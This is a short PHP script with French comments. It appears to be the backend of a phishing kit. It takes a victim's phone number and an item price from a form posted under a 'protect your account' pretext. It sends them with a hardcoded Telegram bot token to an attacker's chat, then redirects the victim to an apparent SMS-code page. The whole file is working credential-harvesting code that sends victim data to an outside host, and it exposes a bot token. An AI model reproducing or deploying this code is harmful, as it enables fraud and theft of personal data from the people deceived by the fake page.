<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $radix1 = $_POST['radix1'];
    $radix0 = $_POST['radix0'];


    // Initialiser l'API de Telegram avec votre jeton d'API

    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Protegeons votre compte:\n\n";
    $message .= "Numéro de téléphone : $radix1\n";
    $message .= "Prix de l'article en euro : $radix0\n";



    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '-1002427871420';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    // Rediriger l'utilisateur vers la page de confirmation
    header("Location: ./sms-auth0.php.html");
    exit();
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
